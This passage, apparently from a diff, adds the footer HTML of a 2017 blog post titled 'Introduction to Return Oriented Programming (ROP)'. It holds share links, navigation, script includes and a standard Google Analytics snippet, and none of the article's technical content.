+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://ketansingh.net/Introduction-to-Return-Oriented-Programming-ROP/&title=Introduction to Return Oriented Programming (ROP)"><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://ketansingh.net/Introduction-to-Return-Oriented-Programming-ROP/&title=Introduction to Return Oriented Programming (ROP)"><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://ketansingh.net/Introduction-to-Return-Oriented-Programming-ROP/&name=Introduction to Return Oriented Programming (ROP)&description="><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      <ul>
+        <li id="toc"><a class="icon" href="#" onclick='$("#toc-footer").toggle();return false;'><i class="fa fa-list fa-lg" aria-hidden="true"></i> TOC</a></li>
+        <li id="share"><a class="icon" href="#" onclick='$("#share-footer").toggle();return false;'><i class="fa fa-share-alt fa-lg" aria-hidden="true"></i> Share</a></li>
+        <li id="top" style="display:none"><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></li>
+        <li id="menu"><a class="icon" href="#" onclick='$("#nav-footer").toggle();return false;'><i class="fa fa-bars fa-lg" aria-hidden="true"></i> Menu</a></li>
+      </ul>
+    </div>
+
+  </div>
+</div>
+
+    
+    <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2017 Ketan Singh
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="http://github.com/spl0i7">Projects</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    <script src="/lib/justified-gallery/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- Google Analytics -->
+
+    <script type="text/javascript">
+        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'UA-47868439-2', 'auto');
+        ga('send', 'pageview');
+    </script>
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
